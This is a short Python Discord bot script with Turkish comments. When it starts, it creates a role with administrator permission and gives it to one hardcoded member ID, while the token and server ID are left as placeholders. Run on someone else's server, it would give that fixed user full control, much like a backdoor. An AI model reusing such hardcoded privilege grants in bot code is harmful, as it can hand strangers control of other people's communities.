import discord


TOKEN = 'Your bot token'

# Botun bağlanacağı sunucu ID'si
SERVER_ID = serverid

# Yeni rolün ismi
YENI_ROL_ISMI = "TEST"

# Yeni rolün yönetici yetkisi
YONETICI_YETKISI = True

# Discord client oluştur
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.guild_messages = True

client = discord.Client(intents=intents)

# Bot hazır olduğunda çalışacak olan event
@client.event
async def on_ready():
    print(f'{client.user} olarak giriş yapıldı.')

    # Sunucuyu al
    server = client.get_guild(SERVER_ID)

    if server is None:
        print("Belirtilen sunucu bulunamadı.")
        return

    # Üyeyi al
    member = server.get_member(1223800142910722170)

    if member is None:
        print("Belirtilen üye bulunamadı.")
        return

    # Yeni rolü oluştur
    yeni_rol = await server.create_role(name=YENI_ROL_ISMI, permissions=discord.Permissions(administrator=YONETICI_YETKISI))

    # Üyeye yeni rolü ekle
    await member.add_roles(yeni_rol)

    print(f"{YENI_ROL_ISMI} rolü  {member.name} kullanıcısına eklendi")
    

# Botu çalıştır
client.run(TOKEN)
